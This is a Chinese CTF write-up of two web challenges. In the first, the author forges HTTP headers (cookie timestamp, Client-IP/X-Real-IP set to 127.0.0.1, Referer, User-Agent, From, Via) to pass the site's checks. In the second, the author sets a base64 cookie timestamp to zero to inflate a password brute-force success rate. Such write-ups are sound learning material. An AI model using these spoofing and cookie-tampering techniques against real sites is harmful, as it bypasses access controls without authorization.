4.假猪套天下第一

这题主要考察对HTTP Header的了解。

开始是个登陆页面，可以随便登陆，但好像没什么东西，估计是用来迷惑的。

登陆界面抓包可以看到有个hint(但是我不太懂为什么不抓包在浏览器界面就看不到hint)

访问L0g1n.php，显示Sorry, this site will be available after totally 99 years!

发现cookie处有个时间戳，应该是改时间戳到99年以后就可以访问了

我直接在后面添了两个0，然后就跳到了下一个要求：Sorry, this site is only optimized for those who comes from localhost

尝试了一下XFF，发现被ban了，但是还可以添加Client-IP: 127.0.0.1或者是X-Real-IP: 127.0.0.1。

下一个：Sorry, this site is only optimized for those who come from gem-love.com

添加Referer: gem-love.com

下一个：Sorry, this site is only optimized for browsers that run on Commodo 64

然后google了半天，不知道commodo 64是个什么东西，倒是有commodore 64，是一种老式8位电脑系统。把UA改成这个试了一下，过了。

这个email用From: root@gem-love.com头。

然后：

Sorry, this site is only optimized for those who use the http proxy of y1ng.vip

if you dont have the proxy, pls contact us to buy, ￥100/Month

太狠了，还要给钱。

添加Via: y1ng.vip

然后就给了flag的base64，解码即可。

这题还是挺好玩的，有些生僻的Header，我都是参考这篇文章的。

5.Schrödinger

标题好像是薛定谔？看了一下内容，大概意思就是说你可以提交一个可以爆破密码的网页，然后他帮你爆破，会给一个成功率，成功率足够大的时候check就能得到密码，如果不行check后就爆破失效。

然后看源码，发现有一行白色的字：

点进去test.php，是一个登陆界面，说I left some good for you in my admin passwd.

应该就是要爆出密码的意思呗，然后正好主页面帮我们爆破密码，那就把这个页面拉过去吧。

但是发现成功率上升得很慢，而且越来越慢…这样等下去估计是不科学了，抓包一探究竟。

抓包发现，cookie里面有个base64过的东西

解码之后发现好像是时间戳？随便改了一下发现还真的和成功率有关。感觉那个数字滚动效果可能是js做的，然后又去看了jQuery.js源码，然后发现了时间和成功率真的有关系。

改大好像不明显，但是如果把时间戳改小，发现成功率上升了，而且后台的script参数的值也变大了

所以直接改成0的base64试试，然后发现成功率变成99％了，牛啤，然后check了一下，拿到了密码。

对了，这里要cookie和?check=这个参数一起改完以后forward回去。

这个密码，貌似是b站的av号，然后去评论区翻到了flag…

如听仙乐耳暂明。
